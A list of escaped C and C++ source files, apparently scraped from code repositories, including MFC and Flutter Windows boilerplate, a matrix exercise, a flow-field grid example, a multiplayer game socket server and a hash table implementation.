    "\ufeff\r\n// ColorImageAlpha1.cpp: \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc5d0 \ub300\ud55c \ud074\ub798\uc2a4 \ub3d9\uc791\uc744 \uc815\uc758\ud569\ub2c8\ub2e4.\r\n//\r\n\r\n#include \"pch.h\"\r\n#include \"framework.h\"\r\n#include \"afxwinappex.h\"\r\n#include \"afxdialogex.h\"\r\n#include \"ColorImageAlpha1.h\"\r\n#include \"MainFrm.h\"\r\n\r\n#include \"ColorImageAlpha1Doc.h\"\r\n#include \"ColorImageAlpha1View.h\"\r\n\r\n#ifdef _DEBUG\r\n#define new DEBUG_NEW\r\n#endif\r\n\r\n\r\n// CColorImageAlpha1App\r\n\r\nBEGIN_MESSAGE_MAP(CColorImageAlpha1App, CWinApp)\r\n\tON_COMMAND(ID_APP_ABOUT, &CColorImageAlpha1App::OnAppAbout)\r\n\t// \ud45c\uc900 \ud30c\uc77c\uc744 \uae30\ucd08\ub85c \ud558\ub294 \ubb38\uc11c \uba85\ub839\uc785\ub2c8\ub2e4.\r\n\tON_COMMAND(ID_FILE_NEW, &CWinApp::OnFileNew)\r\n\tON_COMMAND(ID_FILE_OPEN, &CWinApp::OnFileOpen)\r\n\t// \ud45c\uc900 \uc778\uc1c4 \uc124\uc815 \uba85\ub839\uc785\ub2c8\ub2e4.\r\n\tON_COMMAND(ID_FILE_PRINT_SETUP, &CWinApp::OnFilePrintSetup)\r\nEND_MESSAGE_MAP()\r\n\r\n\r\n// CColorImageAlpha1App \uc0dd\uc131\r\n\r\nCColorImageAlpha1App::CColorImageAlpha1App() noexcept\r\n{\r\n\r\n\t// \ub2e4\uc2dc \uc2dc\uc791 \uad00\ub9ac\uc790 \uc9c0\uc6d0\r\n\tm_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_ALL_ASPECTS;\r\n#ifdef _MANAGED\r\n\t// \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc744 \uacf5\uc6a9 \uc5b8\uc5b4 \ub7f0\ud0c0\uc784 \uc9c0\uc6d0\uc744 \uc0ac\uc6a9\ud558\uc5ec \ube4c\ub4dc\ud55c \uacbd\uc6b0(/clr):\r\n\t//     1) \uc774 \ucd94\uac00 \uc124\uc815\uc740 \ub2e4\uc2dc \uc2dc\uc791 \uad00\ub9ac\uc790 \uc9c0\uc6d0\uc774 \uc81c\ub300\ub85c \uc791\ub3d9\ud558\ub294 \ub370 \ud544\uc694\ud569\ub2c8\ub2e4.\r\n\t//     2) \ud504\ub85c\uc81d\ud2b8\uc5d0\uc11c \ube4c\ub4dc\ud558\ub824\uba74 System.Windows.Forms\uc5d0 \ub300\ud55c \ucc38\uc870\ub97c \ucd94\uac00\ud574\uc57c \ud569\ub2c8\ub2e4.\r\n\tSystem::Windows::Forms::Application::SetUnhandledExceptionMode(System::Windows::Forms::UnhandledExceptionMode::ThrowException);\r\n#endif\r\n\r\n\t// TODO: \uc544\ub798 \uc560\ud50c\ub9ac\ucf00\uc774\uc158 ID \ubb38\uc790\uc5f4\uc744 \uace0\uc720 ID \ubb38\uc790\uc5f4\ub85c \ubc14\uafb8\uc2ed\uc2dc\uc624(\uad8c\uc7a5).\r\n\t// \ubb38\uc790\uc5f4\uc5d0 \ub300\ud55c \uc11c\uc2dd: CompanyName.ProductName.SubProduct.VersionInformation\r\n\tSetAppID(_T(\"ColorImageAlpha1.AppID.NoVersion\"));\r\n\r\n\t// TODO: \uc5ec\uae30\uc5d0 \uc0dd\uc131 \ucf54\ub4dc\ub97c \ucd94\uac00\ud569\ub2c8\ub2e4.\r\n\t// InitInstance\uc5d0 \ubaa8\ub4e0 \uc911\uc694\ud55c \ucd08\uae30\ud654 \uc791\uc5c5\uc744 \ubc30\uce58\ud569\ub2c8\ub2e4.\r\n}\r\n\r\n// \uc720\uc77c\ud55c CColorImageAlpha1App \uac1c\uccb4\uc785\ub2c8\ub2e4.\r\n\r\nCColorImageAlpha1App theApp;\r\n\r\n\r\n// CColorImageAlpha1App \ucd08\uae30\ud654\r\n\r\nBOOL CColorImageAlpha1App::InitInstance()\r\n{\r\n\t// \uc560\ud50c\ub9ac\ucf00\uc774\uc158 \ub9e4\ub2c8\ud398\uc2a4\ud2b8\uac00 ComCtl32.dll \ubc84\uc804 6 \uc774\uc0c1\uc744 \uc0ac\uc6a9\ud558\uc5ec \ube44\uc8fc\uc5bc \uc2a4\ud0c0\uc77c\uc744\r\n\t// \uc0ac\uc6a9\ud558\ub3c4\ub85d \uc9c0\uc815\ud558\ub294 \uacbd\uc6b0, Windows XP \uc0c1\uc5d0\uc11c \ubc18\ub4dc\uc2dc InitCommonControlsEx()\uac00 \ud544\uc694\ud569\ub2c8\ub2e4. \r\n\t// InitCommonControlsEx()\ub97c \uc0ac\uc6a9\ud558\uc9c0 \uc54a\uc73c\uba74 \ucc3d\uc744 \ub9cc\ub4e4 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4.\r\n\tINITCOMMONCONTROLSEX InitCtrls;\r\n\tInitCtrls.dwSize = sizeof(InitCtrls);\r\n\t// \uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8\uc5d0\uc11c \uc0ac\uc6a9\ud560 \ubaa8\ub4e0 \uacf5\uc6a9 \ucee8\ud2b8\ub864 \ud074\ub798\uc2a4\ub97c \ud3ec\ud568\ud558\ub3c4\ub85d\r\n\t// \uc774 \ud56d\ubaa9\uc744 \uc124\uc815\ud558\uc2ed\uc2dc\uc624.\r\n\tInitCtrls.dwICC = ICC_WIN95_CLASSES;\r\n\tInitCommonControlsEx(&InitCtrls);\r\n\r\n\tCWinApp::InitInstance();\r\n\r\n\r\n\t// OLE \ub77c\uc774\ube0c\ub7ec\ub9ac\ub97c \ucd08\uae30\ud654\ud569\ub2c8\ub2e4.\r\n\tif (!AfxOleInit())\r\n\t{\r\n\t\tAfxMessageBox(IDP_OLE_INIT_FAILED);\r\n\t\treturn FALSE;\r\n\t}\r\n\r\n\tAfxEnableControlContainer();\r\n\r\n\tEnableTaskbarInteraction(FALSE);\r\n\r\n\t// RichEdit \ucee8\ud2b8\ub864\uc744 \uc0ac\uc6a9\ud558\ub824\uba74 AfxInitRichEdit2()\uac00 \uc788\uc5b4\uc57c \ud569\ub2c8\ub2e4.\r\n\t// AfxInitRichEdit2();\r\n\r\n\t// \ud45c\uc900 \ucd08\uae30\ud654\r\n\t// \uc774\ub4e4 \uae30\ub2a5\uc744 \uc0ac\uc6a9\ud558\uc9c0 \uc54a\uace0 \ucd5c\uc885 \uc2e4\ud589 \ud30c\uc77c\uc758 \ud06c\uae30\ub97c \uc904\uc774\ub824\uba74\r\n\t// \uc544\ub798\uc5d0\uc11c \ud544\uc694 \uc5c6\ub294 \ud2b9\uc815 \ucd08\uae30\ud654\r\n\t// \ub8e8\ud2f4\uc744 \uc81c\uac70\ud574\uc57c \ud569\ub2c8\ub2e4.\r\n\t// \ud574\ub2f9 \uc124\uc815\uc774 \uc800\uc7a5\ub41c \ub808\uc9c0\uc2a4\ud2b8\ub9ac \ud0a4\ub97c \ubcc0\uacbd\ud558\uc2ed\uc2dc\uc624.\r\n\t// TODO: \uc774 \ubb38\uc790\uc5f4\uc744 \ud68c\uc0ac \ub610\ub294 \uc870\uc9c1\uc758 \uc774\ub984\uacfc \uac19\uc740\r\n\t// \uc801\uc808\ud55c \ub0b4\uc6a9\uc73c\ub85c \uc218\uc815\ud574\uc57c \ud569\ub2c8\ub2e4.\r\n\tSetRegistryKey(_T(\"\ub85c\uceec \uc560\ud50c\ub9ac\ucf00\uc774\uc158 \ub9c8\ubc95\uc0ac\uc5d0\uc11c \uc0dd\uc131\ub41c \uc560\ud50c\ub9ac\ucf00\uc774\uc158\"));\r\n\tLoadStdProfileSettings(4);  // MRU\ub97c \ud3ec\ud568\ud558\uc5ec \ud45c\uc900 INI \ud30c\uc77c \uc635\uc158\uc744 \ub85c\ub4dc\ud569\ub2c8\ub2e4.\r\n\r\n\r\n\t// \uc560\ud50c\ub9ac\ucf00\uc774\uc158\uc758 \ubb38\uc11c \ud15c\ud50c\ub9bf\uc744 \ub4f1\ub85d\ud569\ub2c8\ub2e4.  \ubb38\uc11c \ud15c\ud50c\ub9bf\uc740\r\n\t//  \ubb38\uc11c, \ud504\ub808\uc784 \ucc3d \ubc0f \ubdf0 \uc0ac\uc774\uc758 \uc5f0\uacb0 \uc5ed\ud560\uc744 \ud569\ub2c8\ub2e4.\r\n\tCSingleDocTemplate* pDocTemplate;\r\n\tpDocTemplate = new CSingleDocTemplate(\r\n\t\tIDR_MAINFRAME,\r\n\t\tRUNTIME_CLASS(CColorImageAlpha1Doc),\r\n\t\tRUNTIME_CLASS(CMainFrame),       // \uc8fc SDI \ud504\ub808\uc784 \ucc3d\uc785\ub2c8\ub2e4.\r\n\t\tRUNTIME_CLASS(CColorImageAlpha1View));\r\n\tif (!pDocTemplate)\r\n\t\treturn FALSE;\r\n\tAddDocTemplate(pDocTemplate);\r\n\r\n\r\n\t// \ud45c\uc900 \uc178 \uba85\ub839, DDE, \ud30c\uc77c \uc5f4\uae30\uc5d0 \ub300\ud55c \uba85\ub839\uc904\uc744 \uad6c\ubb38 \ubd84\uc11d\ud569\ub2c8\ub2e4.\r\n\tCCommandLineInfo cmdInfo;\r\n\tParseCommandLine(cmdInfo);\r\n\r\n\r\n\r\n\t// \uba85\ub839\uc904\uc5d0 \uc9c0\uc815\ub41c \uba85\ub839\uc744 \ub514\uc2a4\ud328\uce58\ud569\ub2c8\ub2e4.\r\n\t// \uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8\uc774 /RegServer, /Register, /Unregserver \ub610\ub294 /Unregister\ub85c \uc2dc\uc791\ub41c \uacbd\uc6b0 FALSE\ub97c \ubc18\ud658\ud569\ub2c8\ub2e4.\r\n\tif (!ProcessShellCommand(cmdInfo))\r\n\t\treturn FALSE;\r\n\r\n\t// \ucc3d \ud558\ub098\ub9cc \ucd08\uae30\ud654\ub418\uc5c8\uc73c\ubbc0\ub85c \uc774\ub97c \ud45c\uc2dc\ud558\uace0 \uc5c5\ub370\uc774\ud2b8\ud569\ub2c8\ub2e4.\r\n\tm_pMainWnd->ShowWindow(SW_SHOW);\r\n\tm_pMainWnd->UpdateWindow();\r\n\treturn TRUE;\r\n}\r\n\r\nint CColorImageAlpha1App::ExitInstance()\r\n{\r\n\t//TODO: \ucd94\uac00\ud55c \ucd94\uac00 \ub9ac\uc18c\uc2a4\ub97c \ucc98\ub9ac\ud569\ub2c8\ub2e4.\r\n\tAfxOleTerm(FALSE);\r\n\r\n\treturn CWinApp::ExitInstance();\r\n}\r\n\r\n// CColorImageAlpha1App \uba54\uc2dc\uc9c0 \ucc98\ub9ac\uae30\r\n\r\n\r\n// \uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8 \uc815\ubcf4\uc5d0 \uc0ac\uc6a9\ub418\ub294 CAboutDlg \ub300\ud654 \uc0c1\uc790\uc785\ub2c8\ub2e4.\r\n\r\nclass CAboutDlg : public CDialogEx\r\n{\r\npublic:\r\n\tCAboutDlg() noexcept;\r\n\r\n// \ub300\ud654 \uc0c1\uc790 \ub370\uc774\ud130\uc785\ub2c8\ub2e4.\r\n#ifdef AFX_DESIGN_TIME\r\n\tenum { IDD = IDD_ABOUTBOX };\r\n#endif\r\n\r\nprotected:\r\n\tvirtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV \uc9c0\uc6d0\uc785\ub2c8\ub2e4.\r\n\r\n// \uad6c\ud604\uc785\ub2c8\ub2e4.\r\nprotected:\r\n\tDECLARE_MESSAGE_MAP()\r\n};\r\n\r\nCAboutDlg::CAboutDlg() noexcept : CDialogEx(IDD_ABOUTBOX)\r\n{\r\n}\r\n\r\nvoid CAboutDlg::DoDataExchange(CDataExchange* pDX)\r\n{\r\n\tCDialogEx::DoDataExchange(pDX);\r\n}\r\n\r\nBEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)\r\nEND_MESSAGE_MAP()\r\n\r\n// \ub300\ud654 \uc0c1\uc790\ub97c \uc2e4\ud589\ud558\uae30 \uc704\ud55c \uc751\uc6a9 \ud504\ub85c\uadf8\ub7a8 \uba85\ub839\uc785\ub2c8\ub2e4.\r\nvoid CColorImageAlpha1App::OnAppAbout()\r\n{\r\n\tCAboutDlg aboutDlg;\r\n\taboutDlg.DoModal();\r\n}\r\n\r\n// CColorImageAlpha1App \uba54\uc2dc\uc9c0 \ucc98\ub9ac\uae30\r\n\r\n\r\n\r\n",
    "#include <stdio.h>\r\n#include <locale.h>\r\n\r\nint main(){\r\n\tsetlocale(LC_ALL, \"Portuguese\");\r\n\tint n, m;\r\n\t\r\n\t// Solicita o n\u00famero de linhas e colunas da matriz\r\n\tprintf(\"Digite o n\u00famero de linhas da matriz: \");\r\n    \tscanf(\"%i\", &n);\r\n    \tprintf(\"Digite o n\u00famero de colunas da matriz: \");\r\n    \tscanf(\"%i\", &m);\r\n    \r\n    \t//Matriz A\r\n    \tprintf(\"\\nMatriz A:\\n\");\r\n    \tint A[n][m], B[n][m], x = 1;\r\n    \tfor(int i = 0; i < n; i++){\r\n\t\tfor (int j = 0; j < m; j++){\r\n\t\t\tprintf(\"Digite o %i\u00ba valor: \", x++);\r\n            scanf(\"%i\", &A[i][j]);\r\n\t\t}\r\n\t}\r\n\t//Matriz B\r\n\tfor (int i = 0; i < n; i++) {\r\n        \tfor (int j = 0; j < m; j++) {\r\n            \tB[i][j] = A[i][j] * 3;\r\n        \t}\r\n    \t}\r\n    \t// Imprimir a matriz A\r\n    \tprintf(\"\\n\\nMatriz A:\\n\");\r\n    \tfor (int i = 0; i < n; i++) {\r\n        \tfor (int j = 0; j < m; j++) {\r\n            \tprintf(\"%i \", A[i][j]);\r\n        \t}\r\n        \tprintf(\"\\n\");\r\n    \t}\r\n\t// Imprimir a matriz B\r\n    \tprintf(\"\\n\\nMatriz B:\\n\");\r\n    \tfor (int i = 0; i < n; i++) {\r\n        \tfor (int j = 0; j < m; j++) {\r\n            \tprintf(\"%i \", B[i][j]);\r\n        \t}\r\n        \tprintf(\"\\n\");\r\n    \t}\r\n\treturn 0;\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/*\n    This Source Code Form is subject to the terms of the Mozilla Public\n    License, v. 2.0. If a copy of the MPL was not distributed with this\n    file, You can obtain one at https://mozilla.org/MPL/2.0/.\n*/\n\n#include <iostream>\n#include <proxima/proxima.hpp>\n\nint main()\n{\n    proxima::Grid<uint8_t> grid (10, 10);\n    grid.fill(1);\n\n    grid(0, 0) = 255;\n    grid(9, 6) = 255;\n    grid(8, 6) = 255;\n    grid(7, 6) = 255;\n    grid(6, 6) = 255;\n    grid(5, 6) = 255;\n\n    proxima::Grid<uint16_t> int1 (10, 10);\n    proxima::GenerateIntegrationField(&grid, grid.getIndex(6, 9), &int1);\n\n    proxima::Grid<uint16_t> int2 (10, 10);\n    proxima::GenerateIntegrationField(&grid, grid.getIndex(4, 5), &int2);\n\n    proxima::CombineIntegrationFields(&int1, &int2, &int1);\n\n    proxima::Grid<float> directionField (10, 10);\n    proxima::GenerateVectorField(&int1, &directionField);\n\n    for (uint32_t i = 0; i < grid.height(); i++)\n    {\n        for (uint32_t j = 0; j < grid.width(); j++)\n        {\n            std::cout << directionField(j, i);\n            if (j != grid.width() - 1) std::cout << \",\";\n        }\n        std::cout << \"\\n\";\n    }\n\n    return 0;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"util/util.h\"\n#include \"thread/sudoThreads.h\"\n#include <thread>\n\nusing namespace SudoUno;\nusing namespace std;\n\n// As i've done for all the labs, a vector to hold the threads to keep them referenced until shutdown\nvector <thread> waiterThreads;\n\n// Create a semaphore to ensure that players are added to games in a single-file fashion\nproc::Semaphore canJoin(\"canJoin\", 1, true);\n\n// Spawns a waiter thread to wait for the player to enter a username\nvoid spawnWaiterThread(network::Socket sk) {\n    thread tr(sudoThreads::waiterThreadFunction, sk);\n    waiterThreads.push_back(std::move(tr));\n}\n\nint main() {\n    util::log('I', \"init sudo-uno-server\");\n\n    // TODO: Command-line args to set port number and interface bind\n    const string bind_if = \"0.0.0.0\";\n    const int bind_port = 6969;\n\n    util::log('I', \"Using default settings. Will bind to \" + bind_if + \":\" + to_string(bind_port));\n\n    // Instantiate the socket server\n    // TODO: can we even change the bind if? do we need to?\n    try {\n        network::SocketServer serveSock(6969);\n\n        util::log('I', \"Socket opened on port \" + to_string(bind_port));\n        util::ascii();\n\n        // Loop indefinitely for each request\n        while (true) {\n            util::log('S', \"Waiting for a player to connect...\");\n            network::Socket clientSocket(serveSock.Accept());\n            util::log('S', \"Connection established! Isolating...\");\n\n            // Always wrap connections into their own thread\n            spawnWaiterThread(clientSocket);\n        }\n    } catch (string e) {\n        util::log('E', \"That port is currently bound to another process.\");\n        exit(1);\n    }\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\r\n\r\n#include <optional>\r\n\r\n#include \"flutter/generated_plugin_registrant.h\"\r\n\r\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\r\n    : project_(project) {}\r\n\r\nFlutterWindow::~FlutterWindow() {}\r\n\r\nbool FlutterWindow::OnCreate() {\r\n  if (!Win32Window::OnCreate()) {\r\n    return false;\r\n  }\r\n\r\n  RECT frame = GetClientArea();\r\n\r\n  // The size here must match the window dimensions to avoid unnecessary surface\r\n  // creation / destruction in the startup path.\r\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\r\n      frame.right - frame.left, frame.bottom - frame.top, project_);\r\n  // Ensure that basic setup of the controller was successful.\r\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\r\n    return false;\r\n  }\r\n  RegisterPlugins(flutter_controller_->engine());\r\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\r\n\r\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\r\n    this->Show();\r\n  });\r\n\r\n  // Flutter can complete the first frame before the \"show window\" callback is\r\n  // registered. The following call ensures a frame is pending to ensure the\r\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\r\n  flutter_controller_->ForceRedraw();\r\n\r\n  return true;\r\n}\r\n\r\nvoid FlutterWindow::OnDestroy() {\r\n  if (flutter_controller_) {\r\n    flutter_controller_ = nullptr;\r\n  }\r\n\r\n  Win32Window::OnDestroy();\r\n}\r\n\r\nLRESULT\r\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\r\n                              WPARAM const wparam,\r\n                              LPARAM const lparam) noexcept {\r\n  // Give Flutter, including plugins, an opportunity to handle window messages.\r\n  if (flutter_controller_) {\r\n    std::optional<LRESULT> result =\r\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\r\n                                                      lparam);\r\n    if (result) {\r\n      return *result;\r\n    }\r\n  }\r\n\r\n  switch (message) {\r\n    case WM_FONTCHANGE:\r\n      flutter_controller_->engine()->ReloadSystemFonts();\r\n      break;\r\n  }\r\n\r\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\r\n}\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"hashtable.h\"\n\nstatic int CheckRepeat (List* list, const char* word);\n\nHashTable* HashTableCtor (size_t hash_t_size, uint32_t (*hash_function) (const char*, size_t))\n{\n    HashTable* hash_t = (HashTable*) calloc (1, sizeof (HashTable));\n    hash_t->content = (List*) calloc (hash_t_size, sizeof (List));\n    hash_t->hash_function = hash_function;\n    hash_t->size = hash_t_size;\n\n    for (size_t i = 0; i < hash_t_size; i++)\n        ListCtor (&hash_t->content[i], MIN_CAPACITY);\n\n    return hash_t;\n}\n\nbool FindWord (HashTable* hash_t, const char* word, size_t len)\n{\n    assert (hash_t);\n    assert (word);\n\n    uint32_t hash_value = hash_t->hash_function (word, len) % hash_t->size;\n    List* cur_list = &hash_t->content[hash_value];\n\n    return (bool) CheckRepeat (cur_list, word);\n}\n\nvoid HashTableDtor (HashTable* hash_t)\n{\n    assert (hash_t);\n\n    for (size_t i = 0; i < hash_t->size; i++)\n        ListDtor (&hash_t->content[i]);\n\n    free (hash_t->content);\n    hash_t->content = nullptr;\n\n    hash_t->hash_function = nullptr;\n    hash_t->size = 0;\n\n    free (hash_t);\n    hash_t = nullptr;\n}\n\nvoid FillHashTable (HashTable* hash_t, const char* filename)\n{\n    assert (hash_t);\n    assert (filename);\n\n    char* buffer = GetFileContent (filename);\n    char* buffer_ptr = buffer;\n\n    char word[WORD_LEN] = \"\";\n    size_t len = 0;\n    while (*buffer != '\\0' && sscanf (buffer, \"%s\", word) != 0)\n    {\n        len = strlen (word);\n        InsertValue (hash_t, word, len);\n        buffer += len + 1;\n    }\n\n    free (buffer_ptr);\n}\n\nvoid InsertValue (HashTable* hash_t, const char* word, size_t len)\n{\n    assert (hash_t);\n    assert (word);\n\n    uint32_t hash_value = hash_t->hash_function (word, len) % hash_t->size;\n\n    List* cur_list = &hash_t->content[hash_value];\n    if (CheckRepeat (cur_list, word)) return;\n\n    char* word_ptr = (char*) calloc (1, WORD_LEN);\n    strncpy (word_ptr, word, len);\n\n    InsertTail (cur_list, word_ptr);\n}\n\nstatic int CheckRepeat (List* list, const char* word)\n{\n    assert (list);\n    assert (word);\n\n    Node* nodes_array = list->nodes;\n    int cur_node_index = list->head;\n\n    while (cur_node_index != 0)\n    {\n        Node cur_node = nodes_array[cur_node_index];\n        if (MyStrcmp (word, cur_node.value) == 0) return cur_node_index;\n        cur_node_index = cur_node.next;\n    }\n\n    return 0;\n}\n\nvoid DeleteValue (HashTable* hash_t, const char* word, size_t len)\n{\n    assert (hash_t);\n    assert (word);\n\n    uint32_t hash_value = hash_t->hash_function (word, len) % hash_t->size;\n    List* cur_list = &hash_t->content[hash_value];\n\n    int position = CheckRepeat (cur_list, word);\n    if (position) ListDelete (cur_list, position);\n}\n",
